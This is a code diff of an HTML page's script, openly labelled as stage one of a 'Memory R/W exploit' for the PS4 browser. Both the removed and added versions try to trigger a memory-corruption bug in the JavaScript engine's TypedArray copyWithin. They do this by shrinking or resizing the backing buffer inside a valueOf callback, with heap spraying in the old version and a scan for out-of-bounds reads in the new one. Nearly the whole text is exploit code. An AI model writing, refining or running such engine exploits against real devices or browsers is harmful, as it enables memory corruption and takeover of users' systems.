@@ -19,50 +19,48 @@
 <body>
     <div id="output"></div>
     <script>
-        function logToDiv(msg) {
-            document.getElementById('output').textContent += msg + "\n";
+        function log(msg) {
+            document.getElementById("output").textContent += msg + "\n";
         }
 
-        logToDiv("[*] PsPEE v1.0 - Memory R/W exploit stage 1 (PS4)");
+        log("[INFO] PsPEE v1.0 - Running bug...");
 
-        // Spray some arrays to stabilize memory layout
-        let spray = [];
-        for (let i = 0; i < 100; i++) {
-            spray.push(new ArrayBuffer(0x1000));
-        }
+        // Setup
+        let ab = new ArrayBuffer(0x1000);
+        let u8 = new Uint8Array(ab);
+        let u32 = new Uint32Array(ab);
 
-        // Prepare two overlapping TypedArrays (OOB)
-        let oobArray = new Float64Array(8);
-        let victimArray = [1.1, 1.2, 1.3];
-        let container = {
-            obj: victimArray
-        };
+        for (let i = 0; i < u8.length; i++) u8[i] = 0x41; // Fill with 'A'
 
-        // Create a proxy that triggers the bug
-        let trigger = {
-            valueOf() {
-                logToDiv("[+] Triggering copyWithin underflow...");
-                victimArray.length = 1;  // Shrink it
-                return -0x1000000;       // Large negative
+        // Trigger
+        function call_back() {
+            try {
+                ab.resize(0); // This is the bug trigger
+                log("[+] Resized buffer inside valueOf");
+            } catch (e) {
+                log("[!] Resize failed: " + e);
             }
-        };
+            return 0;
+        }
 
         try {
-            // This triggers `genericTypedArrayViewProtoFuncCopyWithin` bug
-            oobArray.copyWithin(0, trigger);
-            logToDiv("[+] Bug triggered (no crash = good)");
+            u8.copyWithin(0x20, { valueOf: call_back }); // Trigger side effect
+            log("[+] copyWithin completed");
         } catch (e) {
-            logToDiv("[-] Exploit failed: " + e.message);
+            log("[!] copyWithin error: " + e);
         }
 
-        // Check if we can corrupt the victimArray
-        if (victimArray.length > 3) {
-            logToDiv("[!!!] OOB access achieved!");
-            for (let i = 0; i < 10; i++) {
-                logToDiv("victim[" + i + "] = " + victimArray[i]);
+        // Scan memory to detect corruption or success
+        let found = false;
+        for (let i = 0; i < u32.length; i++) {
+            if (u32[i] !== 0x41414141) {
+                log(`[OOB?] u32[${i}] = 0x${u32[i].toString(16)}`);
+                found = true;
             }
-        } else {
-            logToDiv("[-] No OOB access. Need to retune memory layout.");
+        }
+
+        if (!found) {
+            log("[!] No memory corruption detected yet.");
         }
     </script>
 </body>
